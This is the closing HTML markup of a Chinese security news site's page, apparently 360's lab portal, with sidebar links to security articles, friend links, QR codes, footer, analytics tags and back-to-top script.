+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
